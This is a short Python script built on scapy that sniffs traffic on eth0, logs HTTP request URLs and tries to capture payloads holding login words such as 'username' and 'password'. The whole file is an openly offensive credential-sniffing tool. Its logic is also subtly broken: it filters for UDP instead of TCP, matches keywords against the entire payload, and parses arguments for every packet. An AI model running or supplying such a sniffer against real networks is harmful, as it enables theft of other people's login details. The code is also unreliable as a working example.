import scapy.all as scapy
from scapy.layers import http
import argparse
import datetime

KEYWORDS = ["email", "username", "login", "user", "password", "pass"]


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--logging", dest="is_on", help="Logging true(on)/false(off) function. Stores all gathered info into lof file.")
    args = parser.parse_args()
    if not args.is_on:
        parser.error("[-] Please specify a logging true/false function, use --help for more info.")
    return args.is_on


def make_log_file(info):
    current_date = datetime.datetime.now()
    date = current_date.strftime("%Y-%m-%d_%H-%M-%S")
    with open(f"./log_files/for_{date}_.log", mode="a") as new_file:
        new_file.write(info)

def get_url(packet):
    url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
    print(f"[+] HTTP Request: {url}")
    make_log_file(url)
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        login_info = str(packet[scapy.Raw].load)
        if login_info in KEYWORDS:
            print(f"[+] LOAD: {login_info}")
            make_log_file(login_info)
            return login_info

def process_sniffed_packet(packet):
    is_on = get_argument()
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        if is_on:    
            make_log_file(url)
            make_log_file(login_info)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")


sniff("eth0")    